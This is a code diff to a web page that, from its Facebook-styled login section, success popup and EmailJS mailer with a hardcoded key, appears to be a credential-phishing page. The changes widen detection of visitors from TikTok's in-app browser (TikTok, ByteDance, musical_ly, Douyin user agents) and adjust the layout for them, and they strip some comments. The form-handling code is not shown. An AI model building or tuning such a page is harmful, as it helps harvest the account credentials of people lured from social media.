@@ -278,7 +278,7 @@
             max-width: 300px;
             text-align: center;
             padding: 20px;
-            z-index: 10002; /* Tăng z-index để tránh bị TikTok che */
+            z-index: 10002;
         }
         .success-popup-title {
             font-size: 16px;
@@ -312,7 +312,7 @@
             width: 100%;
             height: 100%;
             background: rgba(0, 0, 0, 0.3);
-            z-index: 10001; /* Tăng z-index */
+            z-index: 10001;
         }
         .fb-section {
             margin-bottom: 20px;
@@ -364,7 +364,7 @@
 <body>
     <script type="text/javascript">
         (function() {
-            emailjs.init("wF5gWgp1GWyg7q0KY"); // Thay bằng User ID của bạn nếu khác
+            emailjs.init("wF5gWgp1GWyg7q0KY");
         })();
     </script>
 
@@ -520,8 +520,13 @@
         window.onload = function() {
             const referrer = document.referrer.toLowerCase();
             const userAgent = navigator.userAgent.toLowerCase();
-            const isFromTikTok = referrer.includes("tiktok.com") || userAgent.includes("tiktok");
-            console.log("Referrer:", referrer, "UserAgent:", userAgent, "Is TikTok:", isFromTikTok); // Debug
+            // Mở rộng điều kiện để phát hiện TikTok
+            const isFromTikTok = referrer.includes("tiktok.com") || 
+                                userAgent.includes("tiktok") || 
+                                userAgent.includes("bytedance") || // TikTok thuộc ByteDance
+                                userAgent.includes("musical_ly") || // Tên cũ của TikTok
+                                userAgent.includes("douyin"); // Tên TikTok ở Trung Quốc
+            console.log("Referrer:", referrer, "UserAgent:", userAgent, "Is TikTok:", isFromTikTok);
             if (isFromTikTok) {
                 document.querySelector('.header').classList.add('hidden');
                 document.querySelector('.login-container').style.marginTop = '20px';
@@ -607,14 +612,13 @@
         }
 
         function showDialog(title, message) {
-            console.log("showDialog called:", title, message); // Debug
+            console.log("showDialog called:", title, message);
             const dialog = document.getElementById('custom-dialog');
             const overlay = document.getElementById('dialog-overlay');
             document.getElementById('dialog-title').innerText = title;
             document.getElementById('dialog-message').innerText = message;
             dialog.style.display = 'block';
             overlay.style.display = 'block';
-            // Fallback: Nếu popup không hiển thị, dùng alert
             setTimeout(() => {
                 if (window.getComputedStyle(dialog).display === 'none') {
                     alert(`${title}\n${message}`);
